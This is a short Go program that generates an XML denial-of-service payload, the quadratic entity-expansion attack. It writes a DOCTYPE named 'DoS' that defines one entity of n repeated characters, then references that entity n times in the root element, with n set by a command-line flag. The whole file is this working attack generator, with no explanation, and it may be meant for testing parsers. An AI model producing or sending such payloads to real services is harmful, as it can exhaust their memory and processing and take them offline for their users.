package main

import (
	"bufio"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
)

var ErrNonPositiveN = errors.New("n must be positive")

func main() {
	if err := run(os.Stdout, os.Args); err != nil {
		log.Fatal(err)
	}
}

func run(out io.Writer, args []string) error {
	flags := flag.NewFlagSet(args[0], flag.ExitOnError)
	var n int
	flags.IntVar(&n, "n", 100, "n")
	if err := flags.Parse(args[1:]); err != nil {
		return err
	}
	if n < 1 {
		return ErrNonPositiveN
	}
	w := bufio.NewWriter(out)
	fmt.Fprintln(w, `<?xml version="1.0"?>`)
	fmt.Fprintln(w, `<!DOCTYPE DoS [`)
	fmt.Fprint(w, `  <!ENTITY x "`)
	for i := 0; i < n; i++ {
		fmt.Fprint(w, `A`)
	}
	fmt.Fprintln(w, `">`)
	fmt.Fprintln(w, `]>`)
	fmt.Fprint(w, `<DoS>`)
	for i := 0; i < n; i++ {
		fmt.Fprint(w, `&x;`)
	}
	fmt.Fprintln(w, `</DoS>`)
	w.Flush()
	return nil
}
